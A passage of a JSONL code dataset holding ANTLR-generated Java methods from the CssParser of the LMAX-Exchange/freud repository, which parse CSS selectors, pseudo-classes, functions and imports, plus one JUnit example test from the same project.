1;\n            }\n            switch (alt4) {\n                case 1:\n                    // /home/langera/dev/freud/src/grammar/Css.g:49:18: properties\n                {\n                    pushFollow(FOLLOW_properties_in_nested189);\n                    properties10 = properties();\n\n                    state._fsp--;\n\n                    stream_properties.add(properties10.getTree());\n\n                }\n                break;\n\n            }\n\n            // /home/langera/dev/freud/src/grammar/Css.g:49:30: ( nested )*\n            loop5:\n            do {\n                int alt5 = 2;\n                int LA5_0 = input.LA(1);\n\n                if ((LA5_0 == 28)) {\n                    alt5 = 1;\n                }\n\n\n                switch (alt5) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:49:30: nested\n                    {\n                        pushFollow(FOLLOW_nested_in_nested192);\n                        nested11 = nested();\n\n                        state._fsp--;\n\n                        stream_nested.add(nested11.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        break loop5;\n                }\n            }\n            while (true);\n\n            char_literal12 = (Token) match(input, 30, FOLLOW_30_in_nested195);\n            stream_30.add(char_literal12);\n\n\n            // AST REWRITE\n            // elements: nested, nest, properties\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 49:42: -> ^( NESTED nest ( properties )* ( nested )* )\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:49:45: ^( NESTED nest ( properties )* ( nested )* )\n                {\n                    CommonTree root_1 = (CommonTree) adaptor.nil();\n                    root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(NESTED, \"NESTED\"), root_1);\n\n                    adaptor.addChild(root_1, stream_nest.nextTree());\n                    // /home/langera/dev/freud/src/grammar/Css.g:49:60: ( properties )*\n                    while (stream_properties.hasNext()) {\n                        adaptor.addChild(root_1, stream_properties.nextTree());\n\n                    }\n                    stream_properties.reset();\n                    // /home/langera/dev/freud/src/grammar/Css.g:49:72: ( nested )*\n                    while (stream_nested.hasNext()) {\n                        adaptor.addChild(root_1, stream_nested.nextTree());\n\n                    }\n                    stream_nested.reset();\n\n                    adaptor.addChild(root_0, root_1);\n                }\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"nest\"\n// /home/langera/dev/freud/src/grammar/Css.g:52:1: nest : IDENT ( IDENT )* ( pseudo )* -> ^( NEST IDENT ( IDENT )* ( pseudo )* ) ;\n", "func_signal": "public final CssParser.nest_return nest() throws RecognitionException", "code": "{\n    CssParser.nest_return retval = new CssParser.nest_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token IDENT13 = null;\n    Token IDENT14 = null;\n    CssParser.pseudo_return pseudo15 = null;\n\n\n    CommonTree IDENT13_tree = null;\n    CommonTree IDENT14_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleSubtreeStream stream_pseudo = new RewriteRuleSubtreeStream(adaptor, \"rule pseudo\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:53:2: ( IDENT ( IDENT )* ( pseudo )* -> ^( NEST IDENT ( IDENT )* ( pseudo )* ) )\n        // /home/langera/dev/freud/src/grammar/Css.g:53:4: IDENT ( IDENT )* ( pseudo )*\n        {\n            IDENT13 = (Token) match(input, IDENT, FOLLOW_IDENT_in_nest222);\n            stream_IDENT.add(IDENT13);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:53:10: ( IDENT )*\n            loop6:\n            do {\n                int alt6 = 2;\n                int LA6_0 = input.LA(1);\n\n                if ((LA6_0 == IDENT)) {\n                    alt6 = 1;\n                }\n\n\n                switch (alt6) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:53:10: IDENT\n                    {\n                        IDENT14 = (Token) match(input, IDENT, FOLLOW_IDENT_in_nest224);\n                        stream_IDENT.add(IDENT14);\n\n\n                    }\n                    break;\n\n                    default:\n                        break loop6;\n                }\n            }\n            while (true);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:53:17: ( pseudo )*\n            loop7:\n            do {\n                int alt7 = 2;\n                int LA7_0 = input.LA(1);\n\n                if (((LA7_0 >= 38 && LA7_0 <= 39))) {\n                    alt7 = 1;\n                }\n\n\n                switch (alt7) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:53:17: pseudo\n                    {\n                        pushFollow(FOLLOW_pseudo_in_nest227);\n                        pseudo15 = pseudo();\n\n                        state._fsp--;\n\n                        stream_pseudo.add(pseudo15.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        break loop7;\n                }\n            }\n            while (true);\n\n\n            // AST REWRITE\n            // elements: pseudo, IDENT, IDENT\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 53:25: -> ^( NEST IDENT ( IDENT )* ( pseudo )* )\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:53:28: ^( NEST IDENT ( IDENT )* ( pseudo )* )\n                {\n                    CommonTree root_1 = (CommonTree) adaptor.nil();\n                    root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(NEST, \"NEST\"), root_1);\n\n                    adaptor.addChild(root_1, stream_IDENT.nextNode());\n                    // /home/langera/dev/freud/src/grammar/Css.g:53:42: ( IDENT )*\n                    while (stream_IDENT.hasNext()) {\n                        adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                    }\n                    stream_IDENT.reset();\n                    // /home/langera/dev/freud/src/grammar/Css.g:53:49: ( pseudo )*\n                    while (stream_pseudo.hasNext()) {\n                        adaptor.addChild(root_1, stream_pseudo.nextTree());\n\n                    }\n                    stream_pseudo.reset();\n\n                    adaptor.addChild(root_0, root_1);\n                }\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"function\"\n// /home/langera/dev/freud/src/grammar/Css.g:123:1: function : IDENT '(' ( args )? ')' -> IDENT '(' ( args )* ')' ;\n", "func_signal": "public final CssParser.function_return function() throws RecognitionException", "code": "{\n    CssParser.function_return retval = new CssParser.function_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token IDENT69 = null;\n    Token char_literal70 = null;\n    Token char_literal72 = null;\n    CssParser.args_return args71 = null;\n\n\n    CommonTree IDENT69_tree = null;\n    CommonTree char_literal70_tree = null;\n    CommonTree char_literal72_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleTokenStream stream_62 = new RewriteRuleTokenStream(adaptor, \"token 62\");\n    RewriteRuleTokenStream stream_61 = new RewriteRuleTokenStream(adaptor, \"token 61\");\n    RewriteRuleSubtreeStream stream_args = new RewriteRuleSubtreeStream(adaptor, \"rule args\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:124:2: ( IDENT '(' ( args )? ')' -> IDENT '(' ( args )* ')' )\n        // /home/langera/dev/freud/src/grammar/Css.g:124:4: IDENT '(' ( args )? ')'\n        {\n            IDENT69 = (Token) match(input, IDENT, FOLLOW_IDENT_in_function767);\n            stream_IDENT.add(IDENT69);\n\n            char_literal70 = (Token) match(input, 61, FOLLOW_61_in_function769);\n            stream_61.add(char_literal70);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:124:14: ( args )?\n            int alt26 = 2;\n            int LA26_0 = input.LA(1);\n\n            if ((LA26_0 == IDENT || (LA26_0 >= 36 && LA26_0 <= 37))) {\n                alt26 = 1;\n            }\n            switch (alt26) {\n                case 1:\n                    // /home/langera/dev/freud/src/grammar/Css.g:124:14: args\n                {\n                    pushFollow(FOLLOW_args_in_function771);\n                    args71 = args();\n\n                    state._fsp--;\n\n                    stream_args.add(args71.getTree());\n\n                }\n                break;\n\n            }\n\n            char_literal72 = (Token) match(input, 62, FOLLOW_62_in_function774);\n            stream_62.add(char_literal72);\n\n\n            // AST REWRITE\n            // elements: 62, args, 61, IDENT\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 124:24: -> IDENT '(' ( args )* ')'\n            {\n                adaptor.addChild(root_0, stream_IDENT.nextNode());\n                adaptor.addChild(root_0, stream_61.nextNode());\n                // /home/langera/dev/freud/src/grammar/Css.g:124:37: ( args )*\n                while (stream_args.hasNext()) {\n                    adaptor.addChild(root_0, stream_args.nextTree());\n\n                }\n                stream_args.reset();\n                adaptor.addChild(root_0, stream_62.nextNode());\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"pseudo\"\n// /home/langera/dev/freud/src/grammar/Css.g:88:1: pseudo : ( ( ':' | '::' ) IDENT -> ^( PSEUDO IDENT ) | ( ':' | '::' ) function -> ^( PSEUDO function ) );\n", "func_signal": "public final CssParser.pseudo_return pseudo() throws RecognitionException", "code": "{\n    CssParser.pseudo_return retval = new CssParser.pseudo_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal40 = null;\n    Token string_literal41 = null;\n    Token IDENT42 = null;\n    Token char_literal43 = null;\n    Token string_literal44 = null;\n    CssParser.function_return function45 = null;\n\n\n    CommonTree char_literal40_tree = null;\n    CommonTree string_literal41_tree = null;\n    CommonTree IDENT42_tree = null;\n    CommonTree char_literal43_tree = null;\n    CommonTree string_literal44_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleTokenStream stream_39 = new RewriteRuleTokenStream(adaptor, \"token 39\");\n    RewriteRuleTokenStream stream_38 = new RewriteRuleTokenStream(adaptor, \"token 38\");\n    RewriteRuleSubtreeStream stream_function = new RewriteRuleSubtreeStream(adaptor, \"rule function\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:89:2: ( ( ':' | '::' ) IDENT -> ^( PSEUDO IDENT ) | ( ':' | '::' ) function -> ^( PSEUDO function ) )\n        int alt20 = 2;\n        alt20 = dfa20.predict(input);\n        switch (alt20) {\n            case 1:\n                // /home/langera/dev/freud/src/grammar/Css.g:89:4: ( ':' | '::' ) IDENT\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:89:4: ( ':' | '::' )\n                int alt18 = 2;\n                int LA18_0 = input.LA(1);\n\n                if ((LA18_0 == 38)) {\n                    alt18 = 1;\n                }\n                else if ((LA18_0 == 39)) {\n                    alt18 = 2;\n                }\n                else {\n                    NoViableAltException nvae =\n                            new NoViableAltException(\"\", 18, 0, input);\n\n                    throw nvae;\n                }\n                switch (alt18) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:89:5: ':'\n                    {\n                        char_literal40 = (Token) match(input, 38, FOLLOW_38_in_pseudo493);\n                        stream_38.add(char_literal40);\n\n\n                    }\n                    break;\n                    case 2:\n                        // /home/langera/dev/freud/src/grammar/Css.g:89:9: '::'\n                    {\n                        string_literal41 = (Token) match(input, 39, FOLLOW_39_in_pseudo495);\n                        stream_39.add(string_literal41);\n\n\n                    }\n                    break;\n\n                }\n\n                IDENT42 = (Token) match(input, IDENT, FOLLOW_IDENT_in_pseudo498);\n                stream_IDENT.add(IDENT42);\n\n\n                // AST REWRITE\n                // elements: IDENT\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 89:21: -> ^( PSEUDO IDENT )\n                {\n                    // /home/langera/dev/freud/src/grammar/Css.g:89:24: ^( PSEUDO IDENT )\n                    {\n                        CommonTree root_1 = (CommonTree) adaptor.nil();\n                        root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(PSEUDO, \"PSEUDO\"), root_1);\n\n                        adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                        adaptor.addChild(root_0, root_1);\n                    }\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 2:\n                // /home/langera/dev/freud/src/grammar/Css.g:90:4: ( ':' | '::' ) function\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:90:4: ( ':' | '::' )\n                int alt19 = 2;\n                int LA19_0 = input.LA(1);\n\n                if ((LA19_0 == 38)) {\n                    alt19 = 1;\n                }\n                else if ((LA19_0 == 39)) {\n                    alt19 = 2;\n                }\n                else {\n                    NoViableAltException nvae =\n                            new NoViableAltException(\"\", 19, 0, input);\n\n                    throw nvae;\n                }\n                switch (alt19) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:90:5: ':'\n                    {\n                        char_literal43 = (Token) match(input, 38, FOLLOW_38_in_pseudo514);\n                        stream_38.add(char_literal43);\n\n\n                    }\n                    break;\n                    case 2:\n                        // /home/langera/dev/freud/src/grammar/Css.g:90:9: '::'\n                    {\n                        string_literal44 = (Token) match(input, 39, FOLLOW_39_in_pseudo516);\n                        stream_39.add(string_literal44);\n\n\n                    }\n                    break;\n\n                }\n\n                pushFollow(FOLLOW_function_in_pseudo519);\n                function45 = function();\n\n                state._fsp--;\n\n                stream_function.add(function45.getTree());\n\n\n                // AST REWRITE\n                // elements: function\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 90:24: -> ^( PSEUDO function )\n                {\n                    // /home/langera/dev/freud/src/grammar/Css.g:90:27: ^( PSEUDO function )\n                    {\n                        CommonTree root_1 = (CommonTree) adaptor.nil();\n                        root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(PSEUDO, \"PSEUDO\"), root_1);\n\n                        adaptor.addChild(root_1, stream_function.nextTree());\n\n                        adaptor.addChild(root_0, root_1);\n                    }\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n\n        }\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// + example of use of Custom hamcrest Matcher\n", "func_signal": "@Test\npublic void allImplementorsOfComparatorMustNotContainFields() throws Exception", "code": "{\n    Freud.iterateOver(Class.class).\n            assertThat(no(subTypeOf(Comparator.class)).or(no(withFields()))).\n            in(classOf(asList(\"examples.classobject.StatelessComparator\"))).analyse(listener);\n}", "path": "examples-junit\\src\\test\\java\\examples\\org\\freud\\ClassObjectExamplesJunit.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"importRule\"\n// /home/langera/dev/freud/src/grammar/Css.g:44:1: importRule : ( '@import' | '@include' ) IDENT -> ^( IMPORT IDENT ) ;\n", "func_signal": "public final CssParser.importRule_return importRule() throws RecognitionException", "code": "{\n    CssParser.importRule_return retval = new CssParser.importRule_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token string_literal4 = null;\n    Token string_literal5 = null;\n    Token IDENT6 = null;\n\n    CommonTree string_literal4_tree = null;\n    CommonTree string_literal5_tree = null;\n    CommonTree IDENT6_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleTokenStream stream_26 = new RewriteRuleTokenStream(adaptor, \"token 26\");\n    RewriteRuleTokenStream stream_27 = new RewriteRuleTokenStream(adaptor, \"token 27\");\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:45:2: ( ( '@import' | '@include' ) IDENT -> ^( IMPORT IDENT ) )\n        // /home/langera/dev/freud/src/grammar/Css.g:45:4: ( '@import' | '@include' ) IDENT\n        {\n            // /home/langera/dev/freud/src/grammar/Css.g:45:4: ( '@import' | '@include' )\n            int alt3 = 2;\n            int LA3_0 = input.LA(1);\n\n            if ((LA3_0 == 26)) {\n                alt3 = 1;\n            }\n            else if ((LA3_0 == 27)) {\n                alt3 = 2;\n            }\n            else {\n                NoViableAltException nvae =\n                        new NoViableAltException(\"\", 3, 0, input);\n\n                throw nvae;\n            }\n            switch (alt3) {\n                case 1:\n                    // /home/langera/dev/freud/src/grammar/Css.g:45:5: '@import'\n                {\n                    string_literal4 = (Token) match(input, 26, FOLLOW_26_in_importRule153);\n                    stream_26.add(string_literal4);\n\n\n                }\n                break;\n                case 2:\n                    // /home/langera/dev/freud/src/grammar/Css.g:45:17: '@include'\n                {\n                    string_literal5 = (Token) match(input, 27, FOLLOW_27_in_importRule157);\n                    stream_27.add(string_literal5);\n\n\n                }\n                break;\n\n            }\n\n            IDENT6 = (Token) match(input, IDENT, FOLLOW_IDENT_in_importRule161);\n            stream_IDENT.add(IDENT6);\n\n\n            // AST REWRITE\n            // elements: IDENT\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 45:36: -> ^( IMPORT IDENT )\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:45:39: ^( IMPORT IDENT )\n                {\n                    CommonTree root_1 = (CommonTree) adaptor.nil();\n                    root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(IMPORT, \"IMPORT\"), root_1);\n\n                    adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                    adaptor.addChild(root_0, root_1);\n                }\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"elem\"\n// /home/langera/dev/freud/src/grammar/Css.g:81:1: elem : ( '*' -> ^( UNIVERSAL ) | '#' IDENT -> ^( ID IDENT ) | '.' IDENT -> ^( CLASS IDENT ) | IDENT -> ^( TAG IDENT ) );\n", "func_signal": "public final CssParser.elem_return elem() throws RecognitionException", "code": "{\n    CssParser.elem_return retval = new CssParser.elem_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal34 = null;\n    Token char_literal35 = null;\n    Token IDENT36 = null;\n    Token char_literal37 = null;\n    Token IDENT38 = null;\n    Token IDENT39 = null;\n\n    CommonTree char_literal34_tree = null;\n    CommonTree char_literal35_tree = null;\n    CommonTree IDENT36_tree = null;\n    CommonTree char_literal37_tree = null;\n    CommonTree IDENT38_tree = null;\n    CommonTree IDENT39_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleTokenStream stream_35 = new RewriteRuleTokenStream(adaptor, \"token 35\");\n    RewriteRuleTokenStream stream_36 = new RewriteRuleTokenStream(adaptor, \"token 36\");\n    RewriteRuleTokenStream stream_37 = new RewriteRuleTokenStream(adaptor, \"token 37\");\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:82:2: ( '*' -> ^( UNIVERSAL ) | '#' IDENT -> ^( ID IDENT ) | '.' IDENT -> ^( CLASS IDENT ) | IDENT -> ^( TAG IDENT ) )\n        int alt17 = 4;\n        switch (input.LA(1)) {\n            case 35: {\n                alt17 = 1;\n            }\n            break;\n            case 36: {\n                alt17 = 2;\n            }\n            break;\n            case 37: {\n                alt17 = 3;\n            }\n            break;\n            case IDENT: {\n                alt17 = 4;\n            }\n            break;\n            default:\n                NoViableAltException nvae =\n                        new NoViableAltException(\"\", 17, 0, input);\n\n                throw nvae;\n        }\n\n        switch (alt17) {\n            case 1:\n                // /home/langera/dev/freud/src/grammar/Css.g:82:4: '*'\n            {\n                char_literal34 = (Token) match(input, 35, FOLLOW_35_in_elem421);\n                stream_35.add(char_literal34);\n\n\n                // AST REWRITE\n                // elements:\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 82:8: -> ^( UNIVERSAL )\n                {\n                    // /home/langera/dev/freud/src/grammar/Css.g:82:11: ^( UNIVERSAL )\n                    {\n                        CommonTree root_1 = (CommonTree) adaptor.nil();\n                        root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(UNIVERSAL, \"UNIVERSAL\"), root_1);\n\n                        adaptor.addChild(root_0, root_1);\n                    }\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 2:\n                // /home/langera/dev/freud/src/grammar/Css.g:83:4: '#' IDENT\n            {\n                char_literal35 = (Token) match(input, 36, FOLLOW_36_in_elem434);\n                stream_36.add(char_literal35);\n\n                IDENT36 = (Token) match(input, IDENT, FOLLOW_IDENT_in_elem436);\n                stream_IDENT.add(IDENT36);\n\n\n                // AST REWRITE\n                // elements: IDENT\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 83:14: -> ^( ID IDENT )\n                {\n                    // /home/langera/dev/freud/src/grammar/Css.g:83:17: ^( ID IDENT )\n                    {\n                        CommonTree root_1 = (CommonTree) adaptor.nil();\n                        root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(ID, \"ID\"), root_1);\n\n                        adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                        adaptor.addChild(root_0, root_1);\n                    }\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 3:\n                // /home/langera/dev/freud/src/grammar/Css.g:84:4: '.' IDENT\n            {\n                char_literal37 = (Token) match(input, 37, FOLLOW_37_in_elem451);\n                stream_37.add(char_literal37);\n\n                IDENT38 = (Token) match(input, IDENT, FOLLOW_IDENT_in_elem453);\n                stream_IDENT.add(IDENT38);\n\n\n                // AST REWRITE\n                // elements: IDENT\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 84:14: -> ^( CLASS IDENT )\n                {\n                    // /home/langera/dev/freud/src/grammar/Css.g:84:17: ^( CLASS IDENT )\n                    {\n                        CommonTree root_1 = (CommonTree) adaptor.nil();\n                        root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(CLASS, \"CLASS\"), root_1);\n\n                        adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                        adaptor.addChild(root_0, root_1);\n                    }\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 4:\n                // /home/langera/dev/freud/src/grammar/Css.g:85:4: IDENT\n            {\n                IDENT39 = (Token) match(input, IDENT, FOLLOW_IDENT_in_elem471);\n                stream_IDENT.add(IDENT39);\n\n\n                // AST REWRITE\n                // elements: IDENT\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 85:10: -> ^( TAG IDENT )\n                {\n                    // /home/langera/dev/freud/src/grammar/Css.g:85:13: ^( TAG IDENT )\n                    {\n                        CommonTree root_1 = (CommonTree) adaptor.nil();\n                        root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(TAG, \"TAG\"), root_1);\n\n                        adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                        adaptor.addChild(root_0, root_1);\n                    }\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n\n        }\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"args\"\n// /home/langera/dev/freud/src/grammar/Css.g:107:1: args : expr ( ( ',' )? expr )* -> ( expr )* ;\n", "func_signal": "public final CssParser.args_return args() throws RecognitionException", "code": "{\n    CssParser.args_return retval = new CssParser.args_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal58 = null;\n    CssParser.expr_return expr57 = null;\n\n    CssParser.expr_return expr59 = null;\n\n\n    CommonTree char_literal58_tree = null;\n    RewriteRuleTokenStream stream_31 = new RewriteRuleTokenStream(adaptor, \"token 31\");\n    RewriteRuleSubtreeStream stream_expr = new RewriteRuleSubtreeStream(adaptor, \"rule expr\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:108:2: ( expr ( ( ',' )? expr )* -> ( expr )* )\n        // /home/langera/dev/freud/src/grammar/Css.g:108:4: expr ( ( ',' )? expr )*\n        {\n            pushFollow(FOLLOW_expr_in_args645);\n            expr57 = expr();\n\n            state._fsp--;\n\n            stream_expr.add(expr57.getTree());\n            // /home/langera/dev/freud/src/grammar/Css.g:108:9: ( ( ',' )? expr )*\n            loop24:\n            do {\n                int alt24 = 2;\n                int LA24_0 = input.LA(1);\n\n                if ((LA24_0 == IDENT || LA24_0 == 31 || (LA24_0 >= 36 && LA24_0 <= 37))) {\n                    alt24 = 1;\n                }\n\n\n                switch (alt24) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:108:10: ( ',' )? expr\n                    {\n                        // /home/langera/dev/freud/src/grammar/Css.g:108:10: ( ',' )?\n                        int alt23 = 2;\n                        int LA23_0 = input.LA(1);\n\n                        if ((LA23_0 == 31)) {\n                            alt23 = 1;\n                        }\n                        switch (alt23) {\n                            case 1:\n                                // /home/langera/dev/freud/src/grammar/Css.g:108:10: ','\n                            {\n                                char_literal58 = (Token) match(input, 31, 